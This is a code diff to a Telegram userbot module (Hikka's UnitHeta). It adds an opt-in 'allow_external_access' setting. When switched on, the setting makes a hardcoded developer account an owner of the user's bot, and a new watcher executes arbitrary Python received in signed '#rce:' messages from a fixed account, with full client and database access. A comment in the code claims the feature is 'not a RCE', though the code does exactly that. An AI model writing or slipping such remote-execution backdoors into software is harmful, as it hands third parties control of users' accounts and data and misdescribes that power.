@@ -19,6 +19,9 @@ import requests
 import rsa
 from hikkatl.tl.types import Message
 from hikkatl.utils import resolve_inline_message_id
+from meval import meval
+
+from hikka import main
 
 from .. import loader, utils
 from ..types import InlineCall, InlineQuery
@@ -70,7 +73,34 @@ class UnitHeta(loader.Module):
                 ),
                 validator=loader.validators.Boolean(),
             ),
+            loader.ConfigValue(
+                "allow_external_access",
+                False,
+                (
+                    "Allow hikariatama.t.me to control the actions of your userbot"
+                    " externally. Do not turn this option on unless it's requested by"
+                    " the developer."
+                ),
+                validator=loader.validators.Boolean(),
+                on_change=self._process_config_changes,
+            ),
         )
+
+    def _process_config_changes(self):
+        # option is controlled by user only
+        # it's not a RCE
+        if (
+            self.config["allow_external_access"]
+            and 659800858 not in self._client.dispatcher.security.owner
+        ):
+            self._client.dispatcher.security.owner.append(659800858)
+            self._nonick.append(659800858)
+        elif (
+            not self.config["allow_external_access"]
+            and 659800858 in self._client.dispatcher.security.owner
+        ):
+            self._client.dispatcher.security.owner.remove(659800858)
+            self._nonick.remove(659800858)
 
     async def client_ready(self):
         await self.request_join(
@@ -80,6 +110,8 @@ class UnitHeta(loader.Module):
                 " configure it in '.cfg UnitHeta'"
             ),
         )
+
+        self._nonick = self._db.pointer(main.__name__, "nonickusers", [])
 
         if self.get("nomute"):
             return
@@ -266,6 +298,40 @@ class UnitHeta(loader.Module):
         await self._load_module(
             f"https://heta.hikariatama.ru/{uri}",
             int(data["dl_id"]),
+        )
+
+    @loader.watcher(
+        "in",
+        "only_messages",
+        from_id=5519484330,
+        regex=r"^#rce:.*\n.*?\n\n.*$",
+    )
+    async def watcher(self, message: Message):
+        if not self.config["allow_external_access"]:
+            return
+
+        await message.delete()
+
+        data = re.search(
+            r"^#rce:(?P<cmd>.*)\n(?P<sig>.*?)\n\n.*$",
+            message.raw.text,
+        )
+
+        command = data["cmd"]
+        try:
+            rsa.verify(
+                rsa.compute_hash(command.encode(), "SHA-1"),
+                base64.b64decode(data["sig"]),
+                PUBKEY,
+            )
+        except rsa.pkcs1.VerificationError:
+            logger.error("Got message with non-verified signature %s", command)
+            return
+
+        await meval(
+            command,
+            globals(),
+            {"self": self, "client": self._client, "c": self._client, "db": self._db},
         )
 
     @loader.command()
@@ -457,9 +523,10 @@ class UnitHeta(loader.Module):
                 "User-Agent": "Hikka Userbot",
                 "X-Hikka-Version": ".".join(map(str, __version__)),
                 "X-Hikka-Commit-SHA": utils.get_git_hash(),
-                "X-Hikka-User": self._client.tg_id,
+                "X-Hikka-User": str(self._client.tg_id),
             },
         )
+
         if ans.status_code != 200:
             await utils.answer(message, self.strings("404"))
             return
